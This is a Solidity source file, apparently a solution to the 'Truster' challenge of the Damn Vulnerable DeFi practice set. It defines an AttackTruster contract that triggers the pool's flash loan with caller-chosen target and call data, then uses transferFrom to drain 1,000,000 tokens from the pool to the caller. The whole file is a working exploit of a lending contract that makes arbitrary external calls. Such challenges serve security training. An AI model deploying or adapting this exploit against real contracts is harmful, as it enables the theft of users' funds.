import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackTruster {
    TrusterLenderPool pool;
    IERC20 public immutable damnValuableToken;

    constructor(TrusterLenderPool _pool, address _tokenAddress) {
        pool = _pool;
        damnValuableToken = IERC20(_tokenAddress);
    }

    function attack(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) public {
        pool.flashLoan(borrowAmount, borrower, target, data);
        damnValuableToken.transferFrom(
            address(pool),
            msg.sender,
            1000000 ether
        );
    }
}
